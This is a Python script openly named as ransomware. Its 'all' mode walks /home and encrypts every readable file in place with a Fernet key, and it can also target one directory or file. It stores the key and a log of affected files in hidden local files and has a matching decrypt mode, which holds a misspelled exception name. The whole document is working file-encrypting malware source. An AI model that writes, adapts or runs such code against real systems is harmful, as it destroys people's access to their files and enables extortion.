import sys
from cryptography.fernet import Fernet
import argparse
import os


def main():
	parser = argparse.ArgumentParser(description="ransomware command-line arguments.,expample: python3 ransomeware_4445.py --all -en")

	group = parser.add_mutually_exclusive_group()
	group.add_argument("-a", "--all", action="store_true", help="Perform the operation on all directories.")
	group.add_argument("-d", "--directory", metavar="DIRECTORY_PATH", help="Perform the operation on a specific directory.")
	group.add_argument("-f", "--file", metavar="FILE_PATH", help="Perform the operation on a specific file.")

	# Add an argument for operation (encrypt/decrypt)
	parser.add_argument("-en", "--encrypt", action="store_true", help="Encrypt the data.")
	parser.add_argument("-de", "--decrypt", action="store_true", help="Decrypt the data.")

	args = parser.parse_args()

	if args.encrypt:
		print("User passed -en or --encrypt")

		print("GENERATING KEY.....")
		key = generate_key()
		print(key)
		save_key(key)

		if args.all:
			encrypt_directory("/home", key)
			print("ALL FILES ARE ENCRYPTED")
		elif args.directory:
			encrypt_directory(f"{args.directory}", key)
			print(f"DIRECTORY {args.directory} IS ENCRYPTED")
		elif args.file:
			encrypt_specific_file(f"{args.file}", key)
			print(f"{args.file} IS ENCRYPTED")
		else:
			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")

	elif args.decrypt:
		print("User passed -de or --decrypt")

		print("GETTING KEY FROM FILE....")
		key = get_key_from_file()
		print(key)

		if args.all:
			decrypt_directory("/home", key)
			print("ALL FILES ARE DECRYPTED")
		elif args.directory:
			decrypt_directory(f"{args.directory}", key)
			print(f"DIRECTORY {args.directory} IS DECRYPTED")
		elif args.file:
			decrypt_specific_file(f"{args.file}", key)
			print(f"{args.file} IS DECRYPTED")
		else:
			print("Invalid usage. Use -a, -d <DIRECTORY_PATH>, or -f <FILE_PATH>.")
	else:
		print("No operation specified. Use -en or -de.")


def encrypt_specific_file(file,key):
	with open(file, "rb") as specifiedFile:
		data = specifiedFile.read()
	encrypted_data = Fernet(key).encrypt(data)

	if(has_permission_to_write(file)):
		with open(file, "wb") as encryptedFile:
			encryptedFile.write(encrypted_data)
		with open("./.ransomware_4445_logs.log", "a") as log:
			log.write(file +"\t"+ "ENCRYPTED" +  "\n")


def encrypt_directory(path, key):
	for root, dirs, files in os.walk(path):
		for file in files:
			if(file== "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".ransomware_4445_logs.log"):
				continue
			file_path = os.path.join(root, file)
			if(has_permission_to_read(file_path)):
				encrypt_specific_file(file_path, key)


def decrypt_specific_file(file,key):
	try:
		with open(file, "rb") as specifiedFile:
			data = specifiedFile.read()
		decrypted_data = Fernet(key).decrypt(data)

		if(has_permission_to_write(file)):
			with open(file, "wb") as encryptedFile:
				encryptedFile.write(decrypted_data)
			with open("./.ransomware_4445_logs.log", "a") as log:
				log.write(file +  "\t" + "DECRYPTED" + "\n")
	except Expection as e:
		with open("./.ransomware_4445_logs.log", "a") as log:
			log.write(file + "\t" + "failed to decrypt" + "\n")


def decrypt_directory(path,key):
	for root, dirs, files in os.walk(path):
		for file in files:
			if(file == "ransomware_4445.py" or file == ".encryption_key_4445.key" or file == ".ransomware_4445_logs.log"):
				continue
			file_path = os.path.join(root,file)
			if(has_permission_to_read(file_path)):
				decrypt_specific_file(file_path,key)



def generate_key():
	key = Fernet.generate_key()
	return key

def save_key(key):
	with open("./.encryption_key_4445.key", "wb") as file:
		file.write(key)

def get_key_from_file():
	with open("./.encryption_key_4445.key", "rb") as file:
		return file.read()

def has_permission_to_write(path):
	return os.access(path, os.W_OK)

def has_permission_to_read(path):
	return os.access(path, os.R_OK)



if __name__ == "__main__":
	main()
